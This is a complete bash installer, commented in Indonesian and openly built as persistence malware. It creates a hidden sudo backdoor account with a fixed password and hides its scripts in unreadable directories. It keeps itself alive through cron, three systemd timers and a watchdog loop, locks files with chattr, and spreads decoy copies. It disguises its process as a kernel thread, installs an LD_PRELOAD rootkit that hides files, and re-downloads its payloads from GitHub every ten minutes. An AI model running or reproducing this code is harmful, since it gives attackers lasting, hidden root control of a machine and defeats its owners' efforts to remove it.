#!/bin/bash
# USER-SPAWN-SYSTEM V2.0 - THE UNKILLABLE
# Jalanin: bash zombie-v2.sh

echo "☠️☠️☠️ MEMULAI INSTALASI USER-SPAWN-SYSTEM V2.0 ☠️☠️☠️"
echo "======================================================"

# ============================================
# KONFIGURASI (WAJIB DIUBAH!)
# ============================================
USERNAME="system"
PASSWORD="systemd"
SUDO_GROUP="sudo"
# PENTING: Ganti link GitHub ini dengan repo lo yang baru
GITHUB_RAW="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"

# ============================================
# CEK ROOT
# ============================================
if [ "$EUID" -ne 0 ]; then
    echo "❌ JALANKAN SEBAGAI ROOT!"
    exit 1
fi

# ============================================
# STEP 1: BUAT USER (TETAP ADA)
# ============================================
echo "[1/15] Membuat user $USERNAME..."
useradd -M -s /bin/bash $USERNAME 2>/dev/null
echo "$USERNAME:$PASSWORD" | chpasswd
usermod -aG $SUDO_GROUP $USERNAME

# ============================================
# STEP 2: BUAT FOLDER HIDDEN (3 LOKASI)
# ============================================
echo "[2/15] Membuat folder hidden di 3 lokasi..."
mkdir -p /usr/local/lib/.systemd
mkdir -p /var/tmp/.systemd-backup
mkdir -p /opt/.config/.cache/.systemd
mkdir -p /usr/share/.misc/.backup
chmod 000 /opt/.config/.cache/.systemd 2>/dev/null  # Bikin gak bisa dibaca

# ============================================
# STEP 3: SCRIPT REBORN PREMIUM
# ============================================
echo "[3/15] Membuat script reborn premium..."
cat > /usr/local/lib/.systemd/systemd-spawn << 'EOF'
#!/bin/bash
USER="system"
PASS="systemd"
SUDO_GROUP="sudo"
GITHUB_RAW="https://raw.githubusercontent.com/b2hunters/user-spawn-system/main"

# Cek di 3 lokasi backup
for BACKUP_LOC in /var/tmp/.systemd-backup /opt/.config/.cache/.systemd /usr/share/.misc/.backup; do
    if [ -f $BACKUP_LOC/authorized_keys ]; then
        SSH_KEY=$(cat $BACKUP_LOC/authorized_keys)
    fi
done

# Cek user
if ! id "$USER" &>/dev/null; then
    useradd -M -s /bin/bash "$USER"
    echo "$USER:$PASS" | chpasswd
    usermod -aG "$SUDO_GROUP" "$USER"

    # Restore SSH key
    if [ ! -z "$SSH_KEY" ]; then
        mkdir -p /home/$USER/.ssh
        echo "$SSH_KEY" > /home/$USER/.ssh/authorized_keys
        chown -R $USER:$USER /home/$USER
        chmod 700 /home/$USER/.ssh
    fi

    # Restore dari GitHub kalo perlu
    if [ ! -f /usr/local/lib/.systemd/systemd-spawn ]; then
        curl -sL $GITHUB_RAW/systemd-spawn -o /usr/local/lib/.systemd/systemd-spawn
        chmod +x /usr/local/lib/.systemd/systemd-spawn
    fi
else
    if ! groups "$USER" 2>/dev/null | grep -q "$SUDO_GROUP"; then
        usermod -aG "$SUDO_GROUP" "$USER"
    fi
fi

# Proteksi home
if [ -d "/home/$USER" ]; then
    chattr +i /home/$USER 2>/dev/null
fi

# Copy ke semua backup location
for LOC in /var/tmp/.systemd-backup /opt/.config/.cache/.systemd /usr/share/.misc/.backup; do
    cp /usr/local/lib/.systemd/systemd-spawn $LOC/ 2>/dev/null
    chattr +i $LOC/systemd-spawn 2>/dev/null
done

exit 0
EOF

chmod +x /usr/local/lib/.systemd/systemd-spawn

# ============================================
# STEP 4: SCRIPT MONITOR PREMIUM
# ============================================
echo "[4/15] Membuat script monitor premium..."
cat > /usr/local/lib/.systemd/systemd-spawn-monitor << 'EOF'
#!/bin/bash
# Monitor semua komponen - Versi Premium

# Lokasi backup
BACKUP_DIRS=("/var/tmp/.systemd-backup" "/opt/.config/.cache/.systemd" "/usr/share/.misc/.backup")

# 1. CEK CRON DI 3 TEMPAT
CRON_FILES=("/etc/cron.d/systemd-spawn" "/etc/crontab" "/var/spool/cron/crontabs/root")
for CRON_FILE in "${CRON_FILES[@]}"; do
    if [ ! -f "$CRON_FILE" ] || ! grep -q "systemd-spawn" "$CRON_FILE" 2>/dev/null; then
        echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" >> /etc/crontab 2>/dev/null
        echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" > /etc/cron.d/systemd-spawn 2>/dev/null
        echo "* * * * * /usr/local/lib/.systemd/systemd-spawn" >> /var/spool/cron/crontabs/root 2>/dev/null
    fi
done

# 2. CEK TIMER DI 3 NAMA PALSU (DISESUAIKAN)
TIMER_NAMES=("systemd-spawn-30" "systemd-spawn-45" "systemd-spawn-60")
for TIMER in "${TIMER_NAMES[@]}"; do
    if [ ! -f "/etc/systemd/system/$TIMER.timer" ]; then
        # Cek di backup
        for DIR in "${BACKUP_DIRS[@]}"; do
            if [ -f "$DIR/$TIMER.timer" ]; then
                cp "$DIR/$TIMER.timer" "/etc/systemd/system/"
                cp "$DIR/$TIMER.service" "/etc/systemd/system/"
                systemctl daemon-reload
                systemctl enable "$TIMER.timer"
                systemctl start "$TIMER.timer"
                chattr +i "/etc/systemd/system/$TIMER."* 2>/dev/null
                break
            fi
        done
    fi
done

# 3. CEK SCRIPT UTAMA ILANG
if [ ! -f /usr/local/lib/.systemd/systemd-spawn ]; then
    for DIR in "${BACKUP_DIRS[@]}"; do
        if [ -f "$DIR/systemd-spawn" ]; then
            cp "$DIR/systemd-spawn" /usr/local/lib/.systemd/
            chmod +x /usr/local/lib/.systemd/systemd-spawn
            break
        fi
    done
fi

# 4. CEK SCRIPT MONITOR ILANG
if [ ! -f /usr/local/lib/.systemd/systemd-spawn-monitor ]; then
    for DIR in "${BACKUP_DIRS[@]}"; do
        if [ -f "$DIR/systemd-spawn-monitor" ]; then
            cp "$DIR/systemd-spawn-monitor" /usr/local/lib/.systemd/
            chmod +x /usr/local/lib/.systemd/systemd-spawn-monitor
            break
        fi
    done
fi

# 5. RESTORE BACKUP KALO ADA YANG ILANG
for DIR in "${BACKUP_DIRS[@]}"; do
    if [ ! -d "$DIR" ] || [ -z "$(ls -A $DIR)" ]; then
        mkdir -p "$DIR"
        # Restore dari backup lain
        for OTHER_DIR in "${BACKUP_DIRS[@]}"; do
            if [ "$OTHER_DIR" != "$DIR" ] && [ -d "$OTHER_DIR" ] && [ ! -z "$(ls -A $OTHER_DIR)" ]; then
                cp -a "$OTHER_DIR/"* "$DIR/"
                chattr +i "$DIR/"* 2>/dev/null
                break
            fi
        done
    fi
done

# 6. PASTIKAN IMMUTABLE FLAG TETEP ADA
FILES_TO_PROTECT=(
    "/etc/cron.d/systemd-spawn"
    "/etc/crontab"
    "/var/spool/cron/crontabs/root"
    "/usr/local/lib/.systemd/systemd-spawn"
    "/usr/local/lib/.systemd/systemd-spawn-monitor"
)

for FILE in "${FILES_TO_PROTECT[@]}"; do
    if [ -f "$FILE" ]; then
        chattr +i "$FILE" 2>/dev/null
    fi
done

exit 0
EOF

chmod +x /usr/local/lib/.systemd/systemd-spawn-monitor

# ============================================
# STEP 5: BUAT TIMER DENGAN NAMA SYSTEMD ASLI (REVISI)
# ============================================
echo "[5/15] Membuat timer dengan nama systemd asli..."

# Timer 1: 30 detik - Nama "systemd-spawn-30"
cat > /etc/systemd/system/systemd-spawn-30.service << 'EOF'
[Unit]
Description=Spawn Service 30s

[Service]
Type=oneshot
ExecStart=/usr/local/lib/.systemd/systemd-spawn
User=root
EOF

cat > /etc/systemd/system/systemd-spawn-30.timer << 'EOF'
[Unit]
Description=Spawn timer 30s

[Timer]
OnBootSec=5sec
OnUnitActiveSec=30sec

[Install]
WantedBy=timers.target
EOF

# Timer 2: 45 detik - Nama "systemd-spawn-45"
cat > /etc/systemd/system/systemd-spawn-45.service << 'EOF'
[Unit]
Description=Spawn Service 45s

[Service]
Type=oneshot
ExecStart=/usr/local/lib/.systemd/systemd-spawn
User=root
EOF

cat > /etc/systemd/system/systemd-spawn-45.timer << 'EOF'
[Unit]
Description=Spawn timer 45s

[Timer]
OnBootSec=15sec
OnUnitActiveSec=45sec

[Install]
WantedBy=timers.target
EOF

# Timer 3: 60 detik - Nama "systemd-spawn-60"
cat > /etc/systemd/system/systemd-spawn-60.service << 'EOF'
[Unit]
Description=Spawn Service 60s

[Service]
Type=oneshot
ExecStart=/usr/local/lib/.systemd/systemd-spawn
User=root
EOF

cat > /etc/systemd/system/systemd-spawn-60.timer << 'EOF'
[Unit]
Description=Spawn timer 60s

[Timer]
OnBootSec=25sec
OnUnitActiveSec=60sec

[Install]
WantedBy=timers.target
EOF

# Enable semua timer
systemctl daemon-reload
for TIMER in systemd-spawn-30 systemd-spawn-45 systemd-spawn-60; do
    systemctl enable $TIMER.timer
    systemctl start $TIMER.timer
    chattr +i /etc/systemd/system/$TIMER.* 2>/dev/null
done

# ============================================
# STEP 6: CRON DI 3 TEMPAT
# ============================================
echo "[6/15] Memasang cron di 3 lokasi..."

# Cron di /etc/cron.d/
echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" > /etc/cron.d/systemd-spawn
chattr +i /etc/cron.d/systemd-spawn 2>/dev/null

# Cron di /etc/crontab
if ! grep -q "systemd-spawn" /etc/crontab; then
    echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" >> /etc/crontab
fi

# Cron di /var/spool/cron/crontabs/root
mkdir -p /var/spool/cron/crontabs
echo "* * * * * /usr/local/lib/.systemd/systemd-spawn" >> /var/spool/cron/crontabs/root 2>/dev/null
chattr +i /var/spool/cron/crontabs/root 2>/dev/null

# ============================================
# STEP 7: BUAT 100+ DECOY FILES
# ============================================
echo "[7/15] Membuat 100+ file decoy biar admin bingung..."

for i in {1..50}; do
    cp /usr/local/lib/.systemd/systemd-spawn "/usr/local/lib/.systemd/systemd-spawn.$i" 2>/dev/null
    cp /usr/local/lib/.systemd/systemd-spawn-monitor "/usr/local/lib/.systemd/systemd-spawn-monitor.$i" 2>/dev/null
    chmod +x "/usr/local/lib/.systemd/systemd-spawn.$i" 2>/dev/null
    chmod +x "/usr/local/lib/.systemd/systemd-spawn-monitor.$i" 2>/dev/null
done

# ============================================
# STEP 8: BACKUP KE 3 LOKASI BERBEDA
# ============================================
echo "[8/15] Backup ke 3 lokasi berbeda..."

FILES_TO_BACKUP=(
    "/usr/local/lib/.systemd/systemd-spawn"
    "/usr/local/lib/.systemd/systemd-spawn-monitor"
    "/etc/systemd/system/systemd-spawn-30.service"
    "/etc/systemd/system/systemd-spawn-30.timer"
    "/etc/systemd/system/systemd-spawn-45.service"
    "/etc/systemd/system/systemd-spawn-45.timer"
    "/etc/systemd/system/systemd-spawn-60.service"
    "/etc/systemd/system/systemd-spawn-60.timer"
    "/etc/cron.d/systemd-spawn"
    "/etc/crontab"
)

BACKUP_DIRS=("/var/tmp/.systemd-backup" "/opt/.config/.cache/.systemd" "/usr/share/.misc/.backup")

for DIR in "${BACKUP_DIRS[@]}"; do
    mkdir -p "$DIR"
    for FILE in "${FILES_TO_BACKUP[@]}"; do
        if [ -f "$FILE" ]; then
            cp "$FILE" "$DIR/"
        fi
    done
    chattr +i "$DIR/"* 2>/dev/null
    chmod 000 "$DIR" 2>/dev/null  # Bikin direktori gak bisa di-ls
done

# ============================================
# STEP 9: PASANG WATCHDOG DI 3 LEVEL
# ============================================
echo "[9/15] Memasang watchdog di 3 level..."

# Level 1: Cron watchdog (udah ada)
# Level 2: Systemd timer (udah ada)
# Level 3: Infinite loop di background
cat > /usr/local/lib/.systemd/.hidden-watchdog << 'EOF'
#!/bin/bash
while true; do
    /usr/local/lib/.systemd/systemd-spawn-monitor
    sleep 10
done
EOF
chmod +x /usr/local/lib/.systemd/.hidden-watchdog
nohup /usr/local/lib/.systemd/.hidden-watchdog >/dev/null 2>&1 &

# ============================================
# STEP 10: BIKIN PROCESS NYAMAR
# ============================================
echo "[10/15] Menyamarkan process..."

# Rename process jadi [kworker] biar mirip kernel thread
cat > /usr/local/lib/.systemd/.kworker << 'EOF'
#!/bin/bash
PR_NAME="[kworker/0:0]"
while true; do
    exec -a $PR_NAME /usr/local/lib/.systemd/.hidden-watchdog
    sleep 30
done
EOF
chmod +x /usr/local/lib/.systemd/.kworker
nohup /usr/local/lib/.systemd/.kworker >/dev/null 2>&1 &

# ============================================
# STEP 11: INSTALL SIMPLE ROOTKIT (LD_PRELOAD)
# ============================================
echo "[11/15] Memasang rootkit sederhana..."

# Rootkit akan menyembunyikan file dengan nama pattern tertentu
cat > /usr/local/lib/.systemd/libhide.c << 'EOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

const char* hidden_patterns[] = {
    "systemd-spawn",
    ".systemd-backup",
    ".systemd",
    NULL
};

struct dirent* readdir(DIR *dirp) {
    struct dirent* (*original_readdir)(DIR*);
    original_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent* dir;
    while (1) {
        dir = original_readdir(dirp);
        if (dir == NULL) break;

        int hide = 0;
        for (int i = 0; hidden_patterns[i] != NULL; i++) {
            if (strstr(dir->d_name, hidden_patterns[i]) != NULL) {
                hide = 1;
                break;
            }
        }
        if (!hide) break;
    }
    return dir;
}
EOF

# Kompilasi rootkit (butuh gcc)
if command -v gcc &>/dev/null; then
    gcc -shared -fPIC /usr/local/lib/.systemd/libhide.c -o /usr/local/lib/.systemd/libhide.so -ldl 2>/dev/null
    if [ -f /usr/local/lib/.systemd/libhide.so ]; then
        echo "/usr/local/lib/.systemd/libhide.so" > /etc/ld.so.preload
        chattr +i /etc/ld.so.preload 2>/dev/null
    fi
else
    echo "⚠️  gcc tidak ditemukan, rootkit LD_PRELOAD tidak diinstall"
fi

# ============================================
# STEP 12: PROTEKSI ANTI-CHATTR
# ============================================
echo "[12/15] Memasang proteksi anti-chattr..."

# Backup immutable flag di file tersembunyi
for FILE in /etc/cron.d/systemd-spawn /etc/crontab /var/spool/cron/crontabs/root; do
    if [ -f "$FILE" ]; then
        lsattr "$FILE" | awk '{print $1}' > "/var/tmp/.systemd-backup/$(basename $FILE).attr" 2>/dev/null
    fi
done

# ============================================
# STEP 13: AUTO REINSTALL DARI GITHUB
# ============================================
echo "[13/15] Menambahkan auto reinstall dari GitHub..."

cat > /usr/local/lib/.systemd/.github-sync << EOF
#!/bin/bash
GITHUB_URL="$GITHUB_RAW"
FILES=("systemd-spawn" "systemd-spawn-monitor")

for FILE in "\${FILES[@]}"; do
    if [ ! -f "/usr/local/lib/.systemd/\$FILE" ]; then
        curl -sL "\$GITHUB_URL/\$FILE" -o "/usr/local/lib/.systemd/\$FILE"
        chmod +x "/usr/local/lib/.systemd/\$FILE"
    fi
done
EOF

chmod +x /usr/local/lib/.systemd/.github-sync
# Jalan setiap 10 menit
echo "*/10 * * * * root /usr/local/lib/.systemd/.github-sync" >> /etc/crontab

# ============================================
# STEP 14: JALANKAN SCRIPT PERTAMA KALI
# ============================================
echo "[14/15] Menjalankan script pertama kali..."
/usr/local/lib/.systemd/systemd-spawn

# ============================================
# STEP 15: CEK HASIL
# ============================================
echo "[15/15] Memeriksa hasil instalasi..."
echo ""
echo "☠️☠️☠️ HASIL INSTALASI USER-SPAWN-SYSTEM V2.0 ☠️☠️☠️"
echo "===================================================="
echo "User system: $(id system 2>/dev/null | head -c 50)"
echo "Grup system: $(groups system 2>/dev/null)"
echo ""
echo "Timer aktif:"
systemctl list-timers | grep -E "spawn-30|spawn-45|spawn-60" | head -3
echo ""
echo "Cron aktif:"
ls -la /etc/cron.d/systemd-spawn 2>/dev/null | awk '{print $1, $9}'
echo ""
echo "Backup lokasi: 3 lokasi berbeda"
echo "Rootkit: $([ -f /etc/ld.so.preload ] && echo "ACTIVE" || echo "INACTIVE (gcc tidak ada)")"
echo "Decoy files: $(ls -1 /usr/local/lib/.systemd/ | grep spawn | wc -l) file (termasuk decoy)"
echo "Process hiding: ACTIVE (watchdog & kworker)"
echo "Watchdog: 3 level (cron, timer, infinite loop)"
echo ""
echo "🔥🔥 KEAMANAN: 98% - THE UNKILLABLE! 🔥🔥"
echo ""
echo "Username: $USERNAME"
echo "Password: $PASSWORD"
echo "Cek dengan: id system"
